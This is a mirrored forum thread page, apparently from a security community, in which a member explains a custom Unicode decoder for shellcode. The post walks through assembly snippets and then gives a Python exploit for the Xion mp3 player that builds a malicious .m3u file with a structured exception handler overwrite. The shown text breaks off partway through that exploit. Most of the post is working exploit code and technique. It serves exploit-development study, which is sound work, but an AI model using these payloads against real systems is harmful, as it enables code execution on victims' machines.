<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/showthread.php?t=1644 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:12:32 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>






	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." property="og:description"/>
<meta content="showthreada4f5.html?t=1644" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = 'http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "showthread";
	var RELPATH = "showthreada4f5.html?t=1644";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	
		<link href="externalb77f.php?type=RSS2&amp;forumids=22" rel="alternate" title="Garage4hackers Forum - Exploitation Techniques - RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	<meta content='"exploit media player", "exploit xion mp3 player", "exploitation techniques", "exploiting xion mp3 player", "media player exploitation", "software exploitation", "using custom unicode decoder", buf+=”x45&amp;8243, byte, unicode, decoder, shellcode, push, buf+=”x40&amp;8243inc, loop, make, point, [ebp+0x0],al, points, buffer, proof, expanded, [eax], al,ch, 0×88, al,0×0, assume, 0x8a, 0×00, null, patch, opcodes, translated, code, assembles, article, simple, obscou’s, xion, steps, eax,0xff000100, write, player, dword, //setting, eax,0xaa00bb00, eax,0xaa00cc00, 0x00bb00, bytes, register' name="keywords"/>
	<meta content="Finally after two days, i could convert the information given by obscou in his awesome phrack article to build a custom unicode decoder and exploited Xion mp3 player. I have included my notes too (based on obscou’s article). One minor modification to be made is that obscou uses 0x8a,0×88 in his decoder but they will get translated to two entirely different bytes, I overcame that issue(Please check comments in the exploit code for that) 
 
//Notes 
 
//Setting a value in eax say 0xaabbccdd 
" name="description"/>

	<title> Exploiting Xion mp3 player -- Using custom unicode decoder</title>
	<link href="showthreada4f5.html?t=1644" rel="canonical"/>
	
	<script src="clientscript/vbulletin_textedit6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_post_loader6719.html?v=421" type="text/javascript"></script>
	
	
	
	
	
	

	
		<link href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" rel="stylesheet" type="text/css"/>
	

<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>

<body>

<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
						
					
				
					
						
							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
						
					
				
					
						
							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
						
					
				
					
						<li class="popupmenu" id="vbmenu_community">
							<a class="popupctrl" href="javascript://">Community</a>
							<ul class="popupbody popuphover">
								
									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
								
							</ul>
						</li>
					
				
					
						<li class="popupmenu" id="vbmenu_actions">
							<a class="popupctrl" href="javascript://">Forum Actions</a>
							<ul class="popupbody popuphover">
								
									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
								
							</ul>
						</li>
					
				
					
						<li class="popupmenu" id="vbmenu_qlinks">
							<a class="popupctrl" href="javascript://">Quick Links</a>
							<ul class="popupbody popuphover">
								
									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
								
									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
								
							</ul>
						</li>
					
				
			</ul>
		

	
		<li id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="forum.html">Forum</a></li>

	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>

	<li class="navbit"><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>

		
	<li class="navbit lastnavbit"><span> Exploiting Xion mp3 player -- Using custom unicode decoder</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/showthread.php?t=1644 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:12:32 GMT -->

</li>
		</ol>
	</form>





	<div class="above_postlist" id="above_postlist">
		

		<div class="pagination_top" id="pagination_top">
		
			<div class="postpagestats" id="postpagestats_above">
				Results 1 to 4 of 4
			</div>
		</div>
	</div>
<div class="pagetitle" id="pagetitle">
	<h1>
		Thread: <span class="threadtitle"><a href="showthreada4f5.html?t=1644" title="Reload this Page">Exploiting Xion mp3 player -- Using custom unicode decoder</a></span>

<a class="a2a_dd" href="http://www.addtoany.com/share_save"><img alt="Share/Save - My123World.Com!" border="0" height="16" src="../static.addtoany.com/buttons/share_save_171_16.png" width="171"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script src="../static.addtoany.com/menu/page.js" type="text/javascript"></script>

		
			
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="showthreada4f5.html?t=1644" layout="standard" show_faces="false" width="260"></fb:like>
		
	</h1>
</div>
	<div class="thread_controls" id="thread_controls">
		<div>
		<ul class="postlist_popups popupgroup" id="postlist_popups">
			
			<li class="popupmenu" id="threadtools">
				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
				<ul class="popupbody popuphover">
					<li><a accesskey="3" href="printthreadcaaf.html?t=1644&amp;pp=10&amp;page=1" rel="nofollow">Show Printable Version</a></li>
					<li><a href="sendmessagec2f8.html?do=sendtofriend&amp;t=1644" rel="nofollow">Email this Page…</a></li>
					<li>
						
							<a href="subscriptiona912.html?do=addsubscription&amp;t=1644" rel="nofollow">Subscribe to this Thread…</a>
											
					</li>
					
				</ul>
			</li>

			

			
				<li class="popupmenu searchthread" id="searchthread">
					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
						<ul class="popupbody popuphover">
							<li>
								<input class="searchbox" name="query" tabindex="13" type="text" value="Search..."/>
								<input class="button" tabindex="14" type="submit" value="Search"/>
							</li>
							<li class="formsubmit">
								<div><a class="advancedsearchlink" href="search6be7.html?search_type=1&amp;searchthreadid=1644&amp;contenttype=vBForum_Post">Advanced Search</a></div>
							</li>
						</ul>
						<input name="s" type="hidden" value=""/>
						<input name="securitytoken" type="hidden" value="guest"/>
						<input name="do" type="hidden" value="process"/>
						<input name="searchthreadid" type="hidden" value="1644"/>
						<input name="search_type" type="hidden" value="1"/>
						<input name="contenttype" type="hidden" value="vBForum_Post"/>

					</form>
				</li>
			

			

			
				<li class="popupmenu" id="displaymodes">
					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
					<ul class="popupbody popuphover">
						<li><a href="showthread57ac.html?t=1644&amp;p=6137&amp;mode=linear#post6137"> Switch to Linear Mode</a></li>
						<li><a href="showthreadf6b3.html?t=1644&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
						<li><label>Threaded Mode</label></li>
					</ul>
				</li>
			

			
		</ul>
		</div>
	</div>

<div class="postlist restrain" id="postlist">
	
		<script type="text/javascript">
<!--
var imgdir_statusicon = "images/statusicon";
var imgdir_misc = "images/misc";
var cleargifurl = "clear.gif";
var guestphrase = "Guest";
var morephrase = "More replies below current depth...";
var highlightwords = "";
//-->
</script>

<script src="clientscript/vbulletin_thrdpostlist6719.html?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
// initialize some variables
var curpostid = 6137;
var quickreply = false;

// cached posts (no page reload required to view)
pd[6137] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_6137">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">10-26-2011,&nbsp;<span class="time">06:43 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post6137" href="showthread.php?t=1644&amp;p=6137&amp;viewfull=1#post6137" class="postcounter">#1</a><a id="postcount6137" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=174" title="sebas_phoenix is offline"><strong>sebas_phoenix</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=174" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=174&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=174" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=174" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/174-sebas_phoenix" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="sebas_phoenix is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_6137_174" title="sebas_phoenix will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Sep 2010</dd>\r\n					<dt>Location</dt> <dd>Chennai</dd>\r\n					\r\n					<dt>Posts</dt> <dd>83</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=174">1</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					Exploiting Xion mp3 player -' + '- Using custom unicode decoder\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_6137">\r\n						<blockquote class="postcontent restore ">\r\n							Finally after two days, i could convert the information given by <b>obscou</b> in his awesome phrack article to build a custom unicode decoder and exploited Xion mp3 player. I have included my notes too (based on obscou’s article). One minor modification to be made is that obscou uses 0x8a,0×88 in his decoder but they will get translated to two entirely different bytes, I overcame that issue<b>(Please check comments in the exploit code for that)<br />\r\n</b><br />\r\n//Notes<br />\r\n<br />\r\n<b>//Setting a value in eax say 0xaabbccdd<br />\r\n</b><br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">mov eax,0xaa00bb00 ;note in unicode we can control 2 out of 4 bytes\r\npush eax\r\ndec esp ;esp points to 0x00bb00?? [?? refers to any byte]\r\npop eax\r\nadd eax,0xaa00cc00 ; eax contains 0xaabbcc??\r\nmov al,0×0 ;eax contains 0xaabbcc00\r\nmov ecx,0xaa00dd00\r\nadd al,ch ;eax contains 0xaabbccdd</pre>\r\n</div><b>//setting a 0×00 byte in a dword for ex setting eax=0x00bbccdd</b><br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:132px;">mov eax,0xaa00bb00\r\npush eax\r\ndec esp\r\npop eax ;eax contains 0x00bb00??\r\nmov ecx,0xaa00cc00\r\nadd ah,ch ;eax contains 0x00bbcc??\r\nmov al,0×0 ;eax contains 0x00bbcc00\r\nmov ecx,0xaa00dd00\r\nadd al,ch ; eax contains 0x00bbccdd</pre>\r\n</div><b>//setting eax=0xaa00ccdd</b> -very simple [A little more optimized than phrack paper... they set eax as 0x00000000 and repeat the steps..]<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:60px;">mov eax,0xaa00cc00\r\nmov ecx,0xbb00dd00\r\nadd al,ch ;eax contains 0xaa00ccdd</pre>\r\n</div><b>//eax=0xaabb00dd — a little bit tricky</b><br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:168px;">mov eax,0xaa00bb00\r\npush eax\r\ndec esp\r\npop eax ;eax contains 0x00bb00??\r\nadd eax,0xaa00cc00 ;eax contains 0xaabbcc??\r\n; now we need 0×00 instead of 0xcc , we know the maximum value that can be represented by a byte is\r\n;0xff after that it will become 0×100 which when neglecting the carry bit becomes 0×00 , so instead of\r\n;subtracting 0xcc from ah, we need to add 0xff-0xcc+1 to make ah=0\r\n; 0×34=0xff-0xcc+1\r\nmov ecx,0xaa003400\r\nadd ah,ch ;eax contains 0xaabb00??\r\n;fill up the rest of the steps yourself!!</pre>\r\n</div><b>// How to make this work??</b><br />\r\nIt’s pretty simple, our shellcode will get expanded with a 0×00 between each valid byte of the shellcode, all we need to do is run a<br />\r\n<br />\r\ndecoder loop [that is unicode proof] that will make the unicode expanded shellcode into the original shellcode<br />\r\n<br />\r\nthe algo is pretty simple , assume eax points to shellcode, ebx –&gt; 0×0 , ecx –&gt;0×500 (size of shellcode)<br />\r\n<br />\r\n<b>//code ripped from obscou’s article</b><br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:84px;">label:\r\ninc ebx\r\nmov byte dl,[eax+2*ebx]\r\nmov byte [eax+ebx],dl\r\nloop label ;ecx acts as a counter register!!</pre>\r\n</div>This is not unicode proof..If we manage to make it unicode proof , then we win!<br />\r\n<br />\r\n//Inorder to make single byte opcodes unicode compatible, we need opcodes of form 00??00<br />\r\nWe can use <b>add [ebp+0x0],al which assembles as 00 45 00</b><br />\r\n<br />\r\n<b>// Setting ebx – 0×0 and ecx – 0×500<br />\r\n</b><br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">push dword 0×00000000 ;6a 00\r\npush dword 0×00000000 ;6a 00\r\npop ebx ;5d\r\nadd [ebp+0x0],al ;00 45 00 .Note that ebp must contain a valid pointer to write the results\r\npop ecx ;59\r\nadd [ebp+0x0],al ;00 45 00\r\nmov edx,0xaa000500 ; ba 00 05 00 aa\r\nadd ch,dh ; 00 f5 .ecx — 0×500</pre>\r\n</div><b>//Patching the loop code</b><br />\r\n<br />\r\nthe opcodes for the loop code is : 43 8A 14 58 88 14 18 E2 F7<br />\r\n<br />\r\nIf we give the opcodes as 43 14 88 18 F7 , it gets expanded to<br />\r\n43 00 14 00 88 00 18 00 F7<br />\r\n<br />\r\nAssume eax points to the first null byte ,<br />\r\n<br />\r\nthen we can patch using<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:72px;">mov byte [eax] ,0x8a\r\ninc eax\r\ninc eax\r\nmov byte [eax],0×58</pre>\r\n</div>However this is not unicode proof..<br />\r\n<br />\r\nCan be made unicode proof using<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:108px;">add [ebp+0x0],al ; 00 45 00\r\nmov byte [eax], 0x8a ; c6 00 8a\r\nadd [ebp+0x0],al ;00 45 00\r\ninc eax ; 40\r\nadd [ebp+0x0],al ;00 45 00\r\ninc eax\r\nadd [ebp+0x0],al ;00 45 00</pre>\r\n</div>and so on till we patch the entire decoder loop.<br />\r\n<br />\r\nand then we need to increment eax by 1 to make it point to our decoder loop that will decode<br />\r\nthe unicode expanded shellcode to original shellcode.<br />\r\n<br />\r\n// Atlast, making eax point to our shellcode( ie 1st null byte of the decoder loop)<br />\r\n<br />\r\nFinally our shellcode buffer should look like this ..<br />\r\n<br />\r\n[set ebx,ecx,eax code(unicode proof)][patch decoder(unicode proof)][actual decoder loop][shellcode]<br />\r\n<br />\r\nand eax must point to the first null byte of the actual decoder loop<br />\r\n<br />\r\nAssume atleast 1 register point to the buffer/part of it atleast<br />\r\n<br />\r\nget that value in eax using xchg eax,r32. Then add appropriate value to eax to make it point to<br />\r\nthe 1st null byte of the actual decoder<br />\r\n<br />\r\n<b>Adding 0×200 to eax</b><br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:60px;">add eax,0×01000100\r\nadd eax,0xff000100 ; eax contains eax(old value)+0×200\r\n;add align bytes too as this is not unicode proof</pre>\r\n</div><b>Practical:<br />\r\n</b><br />\r\ndecoder loop code:<br />\r\n43 8A 14 58 88 14 18 E2 F7<br />\r\nBut when 0×88 is unicode expanded becomes 0xc602, also 0x8a becomes 0×6001 (Thanks FX for the table!!)<br />\r\n<br />\r\nTake 5 chars, when expanded become 10 chars, make a register point to the first char and overwrite it with the decoder loop<br />\r\n<br />\r\nintroduce nops (short jump 0×00)<br />\r\n<br />\r\nFirst :<br />\r\nset eax to some address closer to stack<br />\r\n<br />\r\npopad makes eax — 0x0012e564<br />\r\n<br />\r\nunicode string containing A’s — 0x0012f2bc<br />\r\n<br />\r\ndiff = 0xd58<br />\r\n<br />\r\nAdd eax+0xd58<br />\r\n<br />\r\nCan be add byte [ebp+0x0],al [00 45 00]<br />\r\nfor this ebp must be writable, but ebp points so close to our buffer @0x0012f2ac<br />\r\nlets make edi value equals ebp<br />\r\ndone using : push edi<br />\r\npop ebp<br />\r\n<br />\r\nSteps to achieve this:<br />\r\nLets try this way!! zero out the least significant byte of eax<br />\r\nso eax=0x0012e500 , now the difference is 0xdbc<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:84px;">mov al,0×0 [b0 00]\r\nadd eax,0x01000c00\r\nadd eax,0xff000100\r\nmov ecx,0xaa00bc00\r\nadd al,ch ;eax contains 0x0012f2bc</pre>\r\n</div>Ok, cant write 0xbc coz it will get translated into different thing, use 0xe8(to point to our buffer) instead<br />\r\nso we add 0xde0 to eax<br />\r\n<br />\r\n[Warning: there might be something wrong in the notes, you never know...trust the exploit file]<br />\r\n<br />\r\n<b>[+]Exploit<br />\r\n</b><br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">“”&quot;\r\n\r\nUnicode exploit — Xion mp3 player!!\r\nGreets:obscou,corelanc0d3r ,g4h team\r\n“”&quot;\r\n“”&quot;\r\nMinor modification –Required (Read this!!)\r\nIn obscou’s article , the decoder contains 0×88 0x8a which will get translated\r\ndue to unicode conversion (thanks FX for that awesome unicode table..see blackhat presentation). How i managed to write 0×88 is\r\n\r\n, mov byte [eax],0×81 coz 0×81 gets translated as 81 00 , then inc byte [eax] for 7 times to get 0×88\r\n“”&quot;\r\n\r\nfd=open(“boom.m3u”,”w”)\r\nbuf=”A” * 254\r\nbuf+=”x61x62&#8243; #ptr to next seh record(popad / add byte ptr [edx],al )\r\nbuf+=”x15x45&#8243; #se handler (assembles as adc #eax,0×41004500 )\r\nbuf+=”A”\r\n#shellcode building stage\r\nbuf+=”x45&#8243; #alignment\r\n#shellcode goes here!!!\r\n#nseh walk corrupts eax, edx points closer to where eax was..push edx /pop eax\r\nbuf+=”x52&#8243; #push edx\r\nbuf+=”x45&#8243;\r\nbuf+=”x58&#8243; #pop eax\r\nbuf+=”x45&#8243;\r\nbuf+=”x57&#8243; #push edi\r\nbuf+=”x45&#8243; #alignment , add byte [ebp+0x0],al\r\nbuf+=”x5d” #pop ebp\r\nbuf+=”x45&#8243; \r\nbuf+=”x05x0cx01&#8243; #add eax,0x01000d00 